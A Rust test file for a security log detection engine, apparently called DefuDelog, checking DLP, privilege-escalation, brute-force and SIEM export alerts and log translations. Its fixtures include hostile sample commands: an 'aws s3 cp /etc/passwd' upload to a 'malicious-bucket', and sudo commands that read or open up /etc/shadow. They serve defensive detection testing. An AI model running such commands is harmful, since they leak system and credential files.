use chrono::Utc;
use defudelog_lib::db::Database;
use defudelog_lib::engine::DetectionPipeline;
use defudelog_lib::models::{AlertLevel, AppSettings, DetectionRule, LogSource, RuleType, SourceType};
use defudelog_lib::siem_exporter::SiemExporter;
use std::sync::Arc;

fn setup_test_engine() -> (DetectionPipeline, Arc<Database>) {
    let tmp_db_path = format!("{}/defudelog_test_{}.db", std::env::temp_dir().display(), uuid::Uuid::new_v4());
    let db = Arc::new(Database::new(&tmp_db_path).expect("DB initialization failed"));
    
    // Insérer les sources nécessaires pour satisfaire la clé étrangère
    let now = Utc::now();
    for src_id in &["source_test", "auth_source", "syslog_source", "web_source", "custom_source"] {
        let source = LogSource {
            id: src_id.to_string(),
            name: format!("Test Source {}", src_id),
            source_type: SourceType::FileWatcher { path: format!("/var/log/{}.log", src_id), pattern: Some("*.log".to_string()) },
            hostname: "test-host".to_string(),
            os: "linux".to_string(),
            enabled: true,
            priority: "normal".to_string(),
            config: serde_json::json!({ "path": format!("/var/log/{}.log", src_id) }),
            created_at: now,
            updated_at: now,
        };
        let _ = db.insert_log_source(&source);
    }

    let settings = AppSettings::default();
    let engine = DetectionPipeline::new_headless(db.clone(), settings.detection);
    (engine, db)
}

#[test]
fn test_dlp_data_leak_detection() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "POST /api/v1/export HTTP/1.1 payload contains BEGIN RSA PRIVATE KEY and 1000 credit_cards";
    let alert = engine.process_log("source_test", "prod-srv-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "DLP Data leak should generate an alert");
    let alert = alert.unwrap();
    assert_eq!(alert.level, AlertLevel::High, "DLP alert must be High severity");
    assert!(alert.reasons.iter().any(|r| r.contains("DLP") || r.contains("fuite") || r.contains("Template") || r.contains("RSA") || r.contains("Sensible")), "Reasons should mention threat");
}

#[test]
fn test_privilege_escalation_detection() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "sudo: eviluser : TTY=pts/1 ; PWD=/home/eviluser ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow";
    let alert = engine.process_log("source_test", "srv-linux-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "Privilege escalation should generate an alert");
    let alert = alert.unwrap();
    assert_eq!(alert.level, AlertLevel::High, "Privilege escalation must be High severity");
}

#[test]
fn test_brute_force_authentication_burst() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let mut generated_alerts = Vec::new();
    for i in 0..15 {
        let log_line = format!("sshd[{}]: Failed password for invalid user admin from 192.168.1.105 port 42890 ssh2", 1000 + i);
        if let Ok(Some(alert)) = engine.process_log("auth_source", "bastion-01", &log_line, now + chrono::Duration::milliseconds(i * 100)) {
            generated_alerts.push(alert);
        }
    }

    assert!(!generated_alerts.is_empty(), "Brute force burst should trigger alerts");
}

#[test]
fn test_system_anomaly_crash_detection() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "kernel: [12948.102] Out of memory: Kill process 8912 (mysqld) score 920 or sacrifice child";
    let alert = engine.process_log("syslog_source", "db-cluster-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "System crash/OOM should trigger alert");
    let alert = alert.unwrap();
    assert!(alert.level == AlertLevel::High || alert.level == AlertLevel::Moderate);
}

#[test]
fn test_benign_operational_log_no_false_alarm() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let normal_log = "GET /healthz HTTP/1.1 200 OK 0.002s";
    let alert = engine.process_log("web_source", "web-01", normal_log, now)
        .expect("Processing failed");

    assert!(alert.is_none(), "Normal healthcheck log should not trigger an alert");
}

#[test]
fn test_siem_exports_formats() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "exfiltration to s3 bucket aws s3 cp /etc/passwd s3://malicious-bucket/";
    let alert = engine.process_log("source_test", "host-01", raw_log, now)
        .expect("Processing failed")
        .expect("Alert expected");

    let alerts = vec![alert];

    let cef = SiemExporter::export_batch(&alerts, "cef");
    assert!(cef.contains("CEF:0|DefuDelog|Platform|2.0|"), "CEF format invalid");

    let leef = SiemExporter::export_batch(&alerts, "leef");
    assert!(leef.contains("LEEF:2.0|DefuDelog|Platform|2.0|"), "LEEF format invalid");

    let syslog = SiemExporter::export_batch(&alerts, "syslog");
    assert!(syslog.starts_with('<') && syslog.contains("defudelog"), "Syslog RFC 5424 format invalid");
}

#[test]
fn test_custom_rule_engine_integration() {
    let (mut engine, db) = setup_test_engine();
    let now = Utc::now();

    // Insérer une règle personnalisée
    let custom_rule = DetectionRule {
        id: "rule_custom_1".to_string(),
        name: "Confidential Project Keyword".to_string(),
        description: "Détecte le nom de projet confidentiel PROJECT_TITAN".to_string(),
        rule_type: RuleType::Regex,
        pattern: r"(?i)PROJECT_TITAN".to_string(),
        severity: AlertLevel::High,
        enabled: true,
        created_at: now,
    };
    db.upsert_rule(&custom_rule).expect("Insert rule failed");

    let raw_log = "User dev01 downloaded confidential document PROJECT_TITAN_SPEC.pdf";
    let alert = engine.process_log("custom_source", "workstation-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "Custom rule must trigger an alert");
    let alert = alert.unwrap();
    assert_eq!(alert.level, AlertLevel::High);
    assert!(alert.reasons.iter().any(|r| r.contains("Confidential Project Keyword")));
}

#[test]
fn test_semantic_log_translation() {
    let translator = defudelog_lib::translator::LogTranslator::new();

    // 1. Test SSH Connexion Réussie
    let raw_ssh = "Aug 20 09:42:15 server sshd[1842]: Accepted password for admin from 192.168.1.25 port 54321 ssh2";
    let tpl_ssh = "sshd: Accepted <METHOD> for <USER> from <IP> port <PORT> ssh2";
    let params_ssh = vec!["password".to_string(), "admin".to_string(), "192.168.1.25".to_string(), "54321".to_string()];
    let trans1 = translator.translate(raw_ssh, tpl_ssh, &params_ssh);
    assert_eq!(trans1.status_level, "success");
    assert!(trans1.meaning.contains("admin") && trans1.meaning.contains("192.168.1.25"), "SSH translation should contain user and IP: {}", trans1.meaning);

    // 2. Test Sudo Élévation
    let raw_sudo = "sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow";
    let trans2 = translator.translate(raw_sudo, "sudo command", &[]);
    assert_eq!(trans2.status_level, "warning");
    assert!(trans2.meaning.contains("Élévation de privilèges (sudo)"), "Sudo translation failed: {}", trans2.meaning);

    // 3. Test Windows EventLog 4625 (Échec de connexion)
    let raw_win = "EventID=4625 Provider=Microsoft-Windows-Security-Auditing An account failed to log on for user Marc";
    let trans3 = translator.translate(raw_win, "EventID=4625", &[]);
    assert_eq!(trans3.status_level, "error");
    assert!(trans3.meaning.contains("Échec de connexion Windows (EventID 4625)"), "Windows 4625 translation failed: {}", trans3.meaning);

    // 4. Test Windows EventLog 1116 (Windows Defender Malware)
    let raw_defender = "EventID=1116 Provider=Microsoft-Windows-Windows Defender Detected Trojan:Win32/Emotet.A in C:\\test.exe";
    let trans4 = translator.translate(raw_defender, "EventID=1116", &[]);
    assert_eq!(trans4.status_level, "error");
    assert!(trans4.meaning.contains("Windows Defender a détecté un logiciel malveillant"), "Defender translation failed: {}", trans4.meaning);

    // 5. Test Windows EventLog 4740 (Compte verrouillé)
    let raw_lockout = "EventID=4740 Provider=Microsoft-Windows-Security-Auditing A user account was locked out user John";
    let trans5 = translator.translate(raw_lockout, "EventID=4740", &[]);
    assert_eq!(trans5.status_level, "error");
    assert!(trans5.meaning.contains("Compte utilisateur verrouillé"), "Lockout translation failed: {}", trans5.meaning);

    // 6. Test Windows EventLog 1102 (Journal effacé)
    let raw_wipe = "EventID=1102 Provider=Microsoft-Windows-Security-Auditing The audit log was cleared";
    let trans6 = translator.translate(raw_wipe, "EventID=1102", &[]);
    assert_eq!(trans6.status_level, "error");
    assert!(trans6.meaning.contains("audit de sécurité Windows a été effacé"), "Log clear translation failed: {}", trans6.meaning);

    // 7. Test macOS TCC Accès Refusé
    let raw_tcc = "default 10:45:00.123456 tccd: [com.apple.TCC:access] tccd: access denied for client com.suspicious.app to kTCCServiceSystemPolicyAllFiles";
    let trans7 = translator.translate(raw_tcc, "tccd: access denied", &[]);
    assert_eq!(trans7.status_level, "error");
    assert!(trans7.meaning.contains("Contrôle de confidentialité TCC"), "macOS TCC translation failed: {}", trans7.meaning);

    // 8. Test macOS Gatekeeper & XProtect
    let raw_xprotect = "default 10:45:01.000000 XProtectService: XProtect detected signature OSX.Trojan.Gen in payload";
    let trans8 = translator.translate(raw_xprotect, "xprotect", &[]);
    assert_eq!(trans8.status_level, "error");
    assert!(trans8.meaning.contains("Antivirus XProtect"), "macOS XProtect translation failed: {}", trans8.meaning);

    // 9. Test macOS Touch ID (LocalAuthentication)
    let raw_touchid = "default 10:45:02.500000 coreauthd: LocalAuthentication evaluated biometric policy successfully for user alex";
    let trans9 = translator.translate(raw_touchid, "localauthentication", &[]);
    assert_eq!(trans9.status_level, "success");
    assert!(trans9.meaning.contains("Touch ID / Apple Watch"), "macOS TouchID translation failed: {}", trans9.meaning);

    // 10. Test NGINX Erreur 502 Bad Gateway
    let raw_nginx = "192.168.1.50 - - [20/Aug/2026:10:50:00 +0000] \"GET /api/v1/users HTTP/1.1\" 502 150";
    let trans10 = translator.translate(raw_nginx, "\" 502 ", &[]);
    assert_eq!(trans10.status_level, "error");
    assert!(trans10.meaning.contains("Passerelle Défaillante NGINX"), "NGINX 502 translation failed: {}", trans10.meaning);

    // 11. Test Apache ModSecurity WAF Block
    let raw_apache = "[client 10.0.0.99] ModSecurity: Access denied with code 403 (phase 2). Pattern match 'UNION SELECT' at ARGS:id";
    let trans11 = translator.translate(raw_apache, "modsecurity: access denied", &[]);
    assert_eq!(trans11.status_level, "error");
    assert!(trans11.meaning.contains("WAF ModSecurity"), "Apache ModSecurity translation failed: {}", trans11.meaning);

    // 12. Test MySQL Access Denied
    let raw_mysql = "2026-08-20T10:50:02.123456Z 14 [Warning] Access denied for user 'root'@'192.168.1.100' (using password: YES)";
    let trans12 = translator.translate(raw_mysql, "access denied for user", &[]);
    assert_eq!(trans12.status_level, "error");
    assert!(trans12.meaning.contains("Alerte Intrusion MySQL"), "MySQL access denied translation failed: {}", trans12.meaning);

    // 14. Test Variables Nommées Typées & Absence d'inversion
    let raw_inverted = "Aug 21 12:00:00 server sshd[123]: Connection accepted from 192.168.1.99 port 54321 for admin";
    let trans14 = translator.translate(raw_inverted, "accepted password for", &[]);
    assert!(trans14.meaning.contains("192.168.1.99"), "Named IP extraction failed: {}", trans14.meaning);
    assert!(trans14.meaning.contains("admin"), "Named user extraction failed: {}", trans14.meaning);

    // 15. Test Structure Multi-Niveaux (Sens + Explication + Recommandation)
    assert!(trans1.explanation.is_some(), "Explanation should be present for SSH success");
    assert!(trans1.recommendation.is_some(), "Recommendation should be present for SSH success");
    assert!(trans2.explanation.as_ref().unwrap().contains("privilèges") || trans2.explanation.as_ref().unwrap().contains("root"), "Sudo explanation check: {:?}", trans2.explanation);
    assert!(trans2.recommendation.as_ref().unwrap().contains("légitimité") || trans2.recommendation.as_ref().unwrap().contains("utilisateur"), "Sudo recommendation check: {:?}", trans2.recommendation);

    let raw_failed_ssh = "Aug 20 09:45:00 server sshd[1845]: Failed password for invalid user hacker from 203.0.113.50 port 43210 ssh2";
    let trans_failed = translator.translate(raw_failed_ssh, "failed password for invalid user", &[]);
    assert!(trans_failed.explanation.as_ref().unwrap().contains("attaquant") || trans_failed.explanation.as_ref().unwrap().contains("dictionnaire"), "Failed password explanation check: {:?}", trans_failed.explanation);
    assert!(trans_failed.recommendation.as_ref().unwrap().contains("Fail2Ban") || trans_failed.recommendation.as_ref().unwrap().contains("pare-feu"), "Failed password recommendation check: {:?}", trans_failed.recommendation);

    // 16. Test Correspondance Floue (Fuzzy Jaccard Matching)
    let raw_fuzzy = "Aug 21 12:05:00 myhost systemd[1]: user alex session closed completely";
    let trans16 = translator.translate(raw_fuzzy, "session closed for user", &[]);
    assert!(trans16.meaning.contains("Fermeture de session") || trans16.meaning.contains("Déconnexion"), "Fuzzy matching failed: {}", trans16.meaning);

    // 17. Test Règle Personnalisée SQLite / Cache
    translator.insert_custom_translation(
        "custom-dlp-pattern",
        "🚨 Détection Sur-Mesure : Fuite de données classifiée confidentielle par {user}",
        Some("Règle spécifique définie par le responsable SOC pour surveiller un projet critique.".to_string()),
        Some("Bloquez immédiatement l'accès au compte et prévenez l'équipe RSSI.".to_string()),
        "error",
    );
    let trans17 = translator.translate("custom-dlp-pattern triggered for user sophie", "custom-dlp-pattern", &[]);
    assert!(trans17.is_learned);
    assert_eq!(trans17.status_level, "error");
    assert!(trans17.meaning.contains("Détection Sur-Mesure"), "Custom rule failed: {}", trans17.meaning);
    assert!(trans17.meaning.contains("sophie"), "Custom user interpolation failed: {}", trans17.meaning);
    assert!(trans17.explanation.as_ref().unwrap().contains("responsable SOC"));
    assert!(trans17.recommendation.as_ref().unwrap().contains("équipe RSSI"));
}



